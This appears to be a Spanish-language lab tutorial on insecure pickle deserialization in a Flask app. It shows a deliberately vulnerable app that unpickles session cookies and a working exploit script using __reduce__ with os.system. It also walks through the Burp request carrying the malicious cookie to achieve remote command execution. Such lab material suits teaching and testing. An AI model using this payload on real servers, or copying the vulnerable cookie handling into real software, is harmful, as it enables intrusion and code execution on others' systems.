---
icon: python
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Deserialización Insegura Python

## Pagina Vulnerable Deserialización Insegura en Python

Si nosotros por ejemplo tenemos este codigo de `python` como una pagina por ejemplo:

> app.py

```python
import pickle
import base64
from flask import Flask, request, make_response, render_template, redirect, url_for

app = Flask(__name__)

# Base de datos de usuarios (simulada)
users = {
    "admin": "admin123",
    "user1": "password1",
    "user2": "password2"
}

# Clase del usuario (con deserialización insegura)
class User:
    def __init__(self, username, role):
        self.username = username
        self.role = role

    def __str__(self):
        return f"{self.username} ({self.role})"

@app.route("/")
def index():
    # Obtener la cookie
    session_cookie = request.cookies.get("session")

    if session_cookie:
        try:
            # Deserializar la cookie (VULNERABILIDAD)
            user = pickle.loads(base64.b64decode(session_cookie))
        except Exception as e:
            user = f"Error deserializando: {e}"
    else:
        user = "Invitado"

    return render_template("index.html", user=user)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        if username in users and users[username] == password:
            # Crear el objeto de usuario
            user = User(username, "admin" if username == "admin" else "user")

            # Serializar el objeto inseguramente con pickle
            session_data = base64.b64encode(pickle.dumps(user)).decode()

            # Crear la cookie con la sesión serializada
            response = make_response(redirect(url_for("index")))
            response.set_cookie("session", session_data)

            return response
        else:
            return "Credenciales inválidas", 403

    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
```

Vemos que no valida la entrada que se serializa y la `deserializa` lo que venga de forma insegura, ya que no tiene ninguna medida de seguridad, si entramos en la pagina veremos lo siguiente:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

El usuario por defecto sera el siguiente:

```
admin:admin123
```

Ingresamos las credenciales y abriremos `BurpSuite` para recargar la pagina con la sesion iniciada del usuario user y veremos lo siguiente en la `peticion` con `BurpSuite`:

> Peticion de `BurpSuite`

```
GET / HTTP/1.1
Host: app.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://app.dl/login
Connection: keep-alive
Cookie: session=gASVOgAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMCHVzZXJuYW1llIwFYWRtaW6UjARyb2xllIwFYWRtaW6UdWIu
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Vemos que la `serializacion` esta en `session=` por lo que tendremos que reemplazar su contenido, por otro codigo serializado con el comando que queramos ejecutar.

## Generar Payload Serializado en Base64

Nos crearemos un script en `python3` para generar codigos `serializados`:

> exploitSerial.py

```python
import pickle
import base64
import os
import argparse

class RCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))

def generate_payload(command):
    """Genera una cookie maliciosa con el comando proporcionado."""
    try:
        payload = base64.b64encode(pickle.dumps(RCE(command))).decode()
        print(f"[+] Payload generado con el comando: {command}")
        print(f"[+] Cookie maliciosa: {payload}")
    except Exception as e:
        print(f"[!] Error generando el payload: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generador de cookies maliciosas con RCE en Flask")
    parser.add_argument("command", help="Comando a ejecutar en el servidor víctima")

    args = parser.parse_args()
    generate_payload(args.command)
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
python3 exploitSerial.py 'touch /var/www/html/text.txt | whoami > /var/www/html/text.txt'
```

Info:

```
[+] Payload generado con el comando: touch /var/www/html/text.txt | whoami > /var/www/html/text.txt
[+] Cookie maliciosa: gASVWQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD50b3VjaCAvdmFyL3d3dy9odG1sL3RleHQudHh0IHwgd2hvYW1pID4gL3Zhci93d3cvaHRtbC90ZXh0LnR4dJSFlFKULg==
```

## Enviar Payload al servidor

Ahora este resultado tendremos que pegarlo en la peticion donde `session=` quedando de la siguiente forma:

```
GET / HTTP/1.1
Host: app.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://app.dl/login
Connection: keep-alive
Cookie: session=gASVWQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD50b3VjaCAvdmFyL3d3dy9odG1sL3RleHQudHh0IHwgd2hvYW1pID4gL3Zhci93d3cvaHRtbC90ZXh0LnR4dJSFlFKULg==
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Ahora si enviamos la `peticion` veremos lo siguiente en la pagina:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que algo ha sido modificado, por lo que podemos deducir que si ha funcionado correctamente.

Vamos a irnos directamente a la `IP` para ver si el archivo se subio de forma correcta:

```
URL = http://<IP>/text.txt
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, por lo que podremos generar `payloads` y ejecutar codigo de forma remota.
